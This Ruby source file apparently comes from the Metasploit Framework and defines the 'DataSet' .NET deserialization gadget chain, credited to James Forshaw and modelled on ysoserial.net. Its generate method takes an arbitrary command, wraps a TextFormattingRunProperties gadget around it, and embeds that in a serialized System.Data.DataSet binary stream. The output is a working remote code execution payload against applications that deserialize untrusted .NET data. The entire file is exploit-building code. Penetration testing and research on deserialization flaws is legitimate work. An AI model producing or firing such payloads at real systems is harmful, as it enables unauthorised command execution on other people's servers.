module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class DataSet < Types::SerializedStream

    # DataSet
    #   Credits:
    #     Finders: James Forshaw
    #     Contributors: Soroush Dalili
    #   References:
    #     https://github.com/pwntester/ysoserial.net/blob/7a337f0545870b3654364619740de8bc96af38a8/ysoserial/Generators/DataSetGenerator.cs

    def self.generate(cmd)
      inner = GadgetChains::TextFormattingRunProperties.generate(cmd)
      system_data = Assemblies::VERSIONS['4.0.0.0'].fetch('System.Data')
      library = Types::RecordValues::BinaryLibrary.new(
        library_id: 2,
        library_name: system_data.to_s
      )

      self.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        Types::RecordValues::ClassWithMembersAndTypes.new(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: "System.Data.DataSet",
            member_names: %w[
              DataSet.RemotingFormat
              DataSet.DataSetName
              DataSet.Namespace
              DataSet.Prefix
              DataSet.CaseSensitive
              DataSet.LocaleLCID
              DataSet.EnforceConstraints
              DataSet.ExtendedProperties
              DataSet.Tables.Count
              DataSet.Tables_0
            ]
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ Class String String String Primitive Primitive Primitive Object Primitive PrimitiveArray },
            additional_infos: [
              {type_name: 'System.Data.SerializationFormat', library_id: library.library_id},
              1,
              8,
              1,
              8,
              2
            ]
          ),
          library_id: library.library_id,
          member_values: [
            Types::Record.from_value(Types::RecordValues::ClassWithMembersAndTypes.new(
              class_info: Types::General::ClassInfo.new(
                obj_id: -3,
                name: 'System.Data.SerializationFormat',
                member_names: %w[ value__ ]
              ),
              member_type_info: Types::General::MemberTypeInfo.new(
                binary_type_enums: %i{ Primitive },
                additional_infos: [ 8 ]
              ),
              library_id: library.library_id,
              member_values: [ 1 ]
            )),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 4)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 4)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 4)),
            false,
            1033,
            false,
            Types::Record.from_value(Types::RecordValues::ObjectNull.new),
            1,
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 5))
          ]
        ),
        Types::RecordValues::ArraySinglePrimitive.new(
          array_info: {
            obj_id: 5,
            member_count: inner.num_bytes
          },
          primitive_type_enum: Enums::PrimitiveTypeEnum[:Byte],
          members: inner.to_binary_s.bytes
        ),
        Types::RecordValues::MessageEnd.new
      ])
    end

  end

end
end
end
end
